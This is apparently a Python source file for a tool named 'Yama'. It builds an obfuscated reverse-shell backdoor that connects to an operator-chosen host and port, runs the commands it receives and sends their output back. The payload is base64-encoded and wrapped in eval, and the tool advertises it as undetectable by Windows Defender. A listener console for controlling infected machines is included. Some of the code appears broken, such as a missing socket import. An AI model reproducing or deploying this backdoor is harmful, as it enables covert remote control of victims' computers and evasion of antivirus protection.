#!/usr/bin/env python
#
# AUTHOR: Sub0
# VERSION: 1.0.0 [BETA]
# GITHUB: https://github.com/Sub0a
# DISCORD: sub0a
#
###############
#  LIBRARIES  #
###############
import os
import time
import base64
import pyminifier
import argparse

YAMA_LOGO_BANNER = ("""

 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⠶⠿⢿⣿⣿⣿⣿⣷⣶⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠋⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣴⣾⣿⣿⣿⣷⣶⣤⡈⠙⢿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⣿⣧⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢿⣿⣿⣿⣿⣇⠀⠀
 ⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢸⣿⣿⣿⣿⣿⡄⠀
 ⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢹⣿⣿⣿⣿⣿⣆⣠⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣷⠀
 ⠀⠀⢰⣶⡆⠀⠀⠀⠀⢀⣀⣀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⣿⣿⡆
 ⢀⠀⢸⣿⣧⣰⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⣿⣿⣇
 ⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿
 ⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣈⠉⠛⠛⠛⠛⢉⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋
 ⣶⣌⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣋⣥⣾⡿
 ⠙⢿⣿⣷⣶⣬⣙⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⢛⣉⣥⣴⣾⣿⣿⣿⣿⡇
 ⠀⠀⠙⣿⡟⢿⣿⣿⣿⣷⣶⣦⣬⣭⣉⣙⣛⣛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⢛⣛⣛⣋⣩⣭⣭⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
 ⠀⠀⠀⣿⡇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
 ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
 ⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⢉⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

 AUTHOR: @Sub0
 VERSION: 1.0.0 [BETA]
 GITHUB: https://github.com/Sub0a
 DISCORD: sub0a
""")

YAMA_MENU_BANNER = ("""
 ╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗
 ║>>> help          Show all commands of [Yama] software                               ║
 ║>>> listener      Start the listener of [YAMA] software                              ║
 ║>>> banner        Show the banner of [YAMA] software                                 ║
 ║>>> reset         Reset the appearance of [Yama] software                            ║
 ║>>> quit          Quit [Yama] software                                               ║
 ╚═════════════════════════════════════════════════════════════════════════════════════╝
""")

YAMA_LISTENER_BANNER = ("""
 ╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗
 ║>>> help          Show all commands of [Listener] tool                               ║
 ║>>> quit          Quit [Listener] tool                                               ║
 ╚═════════════════════════════════════════════════════════════════════════════════════╝
""")

def TEXT_DELAY(TEXT, DELAY):
    for CHAR in TEXT:
        print(CHAR, end='', flush=True)
        time.sleep(DELAY)
    print()

def BACKDOOR():
    LHOST = input(" \033[97;1m╔═[LHOST] ╚═════════>>> ")
    LPORT = input(" \033[97;1m╔═[LPORT] ╚═════════>>> ")

    PAYLOAD = '''
import os
import socket
import subprocess

BHOST = "{LHOST}"
BPORT = {LPORT}

def BACKDOOR():
    BACKDOOR_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BACKDOOR_SOCKET.connect((BHOST, BPORT))

    while True:
        COMMAND = BACKDOOR_SOCKET.recv(8192).decode()

        if COMMAND == "exit":
            BACKDOOR_SOCKET.close()
            break

        OUTPUT = subprocess.check_output(COMMAND, shell=False, stderr=subprocess.STDOUT).decode()
        
        BACKDOOR_SOCKET.send(OUTPUT.encode())

BACKDOOR()    
'''
    
    PAYLOAD_OBFUSCATED = base64.b64encode(pyminifier.dedent(PAYLOAD).encode()).decode()
    
    BACKDOOR_RAW = f"eval(compile(base64.b64decode('{PAYLOAD_OBFUSCATED}'.encode()), '<string>', 'exec'))"
    return BACKDOOR_RAW
    
def LISTENER():

    os.system("clear")

    TEXT_DELAY(YAMA_LOGO_BANNER, 0.0005)
    TEXT_DELAY(YAMA_LISTENER_BANNER, 0.0005)

    LHOST = input(" \033[97;1m╔═[LHOST] ╚═════════>>> ")
    LPORT = input(" \033[97;1m╔═[LPORT] ╚═════════>>> ")

    LISTENER_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    LISTENER_SOCKET.bind((LHOST, LPORT))
    LISTENER_SOCKET.listen(1)
    print(f" [...] Waiting for a connection on {LHOST}:{LPORT}")
    
    CONN, ADDR = LISTENER_SOCKET.accept()
    print(f" [...] Connection established from {ADDR[0]}:{ADDR[1]}")
    
    while True:
        print("")
        print(" ╔═[Listener]")
        print(" ╚═════════>", end=" ") 
        LISTENER_INPUT = input()
        
        if LISTENER_INPUT == "help":
           print(" [...] Show all commands of [Yama] software in progress...")
           time.sleep(2)
           TEXT_DELAY(YAMA_LISTENER_BANNER, 0.0005)
           time.sleep(10)
           LISTENER()
        
        if LISTENER_INPUT  == "quit":
           print(" [...] Quit [Listener] tool in progress...")
           time.sleep(2)
           CONN.send(LISTENER_INPUT.encode()) 
           CONN.close()
           break
            
        CONN.sendall(LISTENER_INPUT.encode())
        
        OUTPUT = CONN.recv(8192).decode()
        print(OUTPUT)

    LISTENER_SOCKET.close()

def YAMA():
    
    os.system("clear")
    
    TEXT_DELAY(YAMA_LOGO_BANNER, 0.0005)
    TEXT_DELAY(YAMA_MENU_BANNER, 0.0005)
    
    while True:
        print("")
        print(" [Use the 'help' command in the software]")
        print(" ╔═[Yama]")
        print(" ╚═════════>", end=" ") 
        YAMA_INPUT = input()
        
        if YAMA_INPUT == "help":
           print(" [...] Show all commands of [Yama] software in progress...")
           time.sleep(2)
           TEXT_DELAY(YAMA_MENU_BANNER, 0.0005)
           time.sleep(10)
           YAMA()
           
        if YAMA_INPUT == "listener":
           print(" [...] Start the listener of [YAMA] software in progress...")
           time.sleep(2)
           LISTENER()

        if YAMA_INPUT == "banner":
           print(" [...] Show the banner of [YAMA] software in progress...")
           time.sleep(2)
           TEXT_DELAY(YAMA_LOGO_BANNER, 0.0005)
           time.sleep(5)
           YAMA()
           
        if YAMA_INPUT == "reset":
           print(" [...] Reset the appearance of [Yama] software in progress...")
           time.sleep(2)
           YAMA()
        
        if YAMA_INPUT == "quit":
           print(" [...] Quit [Yama] software in progress...")
           time.sleep(2)
           os._exit(0)

def COMMANDS():
    PARSER = argparse.ArgumentParser(description="Generate a backdoor obfuscate FUD undetectable by Windows Defender")
    PARSER.add_argument("--generate", action="store_true", help="Generate a backdoor obfuscate FUD undetectable by Windows Defender")
    ARGS = PARSER.parse_args()

    if ARGS.generate:
        BACKDOOR_RAW = BACKDOOR()
        time.sleep(2)
        print("[...] Generation of the backdoor in progress...")
        print(BACKDOOR_RAW)
    else:
        YAMA()

COMMANDS()
